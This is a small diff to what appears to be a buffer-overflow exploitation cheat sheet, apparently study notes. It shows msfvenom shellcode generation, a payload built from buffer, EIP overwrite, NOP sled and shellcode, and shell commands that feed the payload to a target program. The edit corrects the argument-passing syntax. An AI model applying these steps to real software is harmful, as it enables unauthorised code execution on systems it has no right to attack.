@@ -306,7 +306,7 @@ msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python		# make payload, cop
 print(buff + eip + nop + buf)		# add 'buf' to print statement in script
 
 ./<program> <<< $(python <script.py)		# save script and run on program
-./<program> < $(python <script.py)		# use this instead if program takes parameter instead of input
+./<program> $(python <script.py)		# use this instead if program takes parameter instead of input
 # if works change payload  to something usefull (like cat <file>) and run again
 
 ## in windows...
